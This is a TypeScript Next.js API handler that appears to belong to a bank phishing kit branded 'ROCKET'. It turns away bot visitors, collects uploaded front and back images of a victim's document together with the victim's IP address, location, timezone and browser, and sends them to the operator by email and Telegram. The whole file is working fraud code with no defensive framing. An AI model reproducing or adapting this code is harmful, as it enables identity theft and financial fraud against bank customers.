import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendEmail } from "../../utils/sendEmail";
import { sendTelegram } from "../../utils/sendTelegram";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.send(`Fuck off`);
    return;
  }

  const front = req.files?.front as any;
  const back = req.files?.back as any;
  const form = req.body.form[0];

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<h4>SUPPORTING DOCUMENTS</h4>
<p>| (▰˘◡˘▰) See attached files</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
    `;

    if (process.env.TO) {
      await sendEmail(
        message,
        `${process.env.BANK_NAME} - ${form} by ROCKET 🚀🚀🚀 From ${ip}`,
        [
          {
            filename: `Front.${front[0].headers[`content-type`].split(`/`)[1]}`,
            content: front[0],
          },
          {
            filename: `Back.${back[0].headers[`content-type`].split(`/`)[1]}`,
            content: back[0],
          },
        ]
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
        ${process.env.BANK_NAME} - ${form} by ROCKET 🚀🚀🚀 From ${ip}
        ${message}
      `,
        medias: [front[0], back[0]],
      });
    }

    res.send(Promise.resolve());
  } catch (error) {
    console.log(error);
    res.status(500).send(`Something went wrong`);
  }
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
